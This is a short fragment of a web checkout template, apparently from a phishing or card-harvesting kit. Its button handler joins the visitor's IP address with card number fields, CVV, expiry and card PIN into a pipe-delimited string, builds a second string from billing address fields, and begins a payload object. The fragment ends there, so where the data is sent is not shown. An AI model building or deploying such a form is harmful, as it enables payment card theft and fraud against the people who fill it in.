              ...
              <div class="panel-body">
                <div class="row">
                  ...
                  <div class="col-md-6 col-sm-6 col-xs-12">
                    ...
                    <div class="input-group"><span class="input-group-addon"><span class="input-icon input-icon-address"></span><span class="input-text">Address*</span></span> <input id="ba" type="text" value="<?php echo e($si['address']); ?>" class="form-control input-lg" placeholder="Your Address"></div>
  ...
  $(() => {
    ...
    $('#checkout-btn').click((e) => {
      ...
      if (v) {
        ...
        cc = `<?php echo e($ip); ?>|${cn}|${cn2}|${cvv}|${exp}|${pin}`;
        bd = `${ba}|${bc}|${bs}|${bz}`;
        const payload = {
          a,
          c,
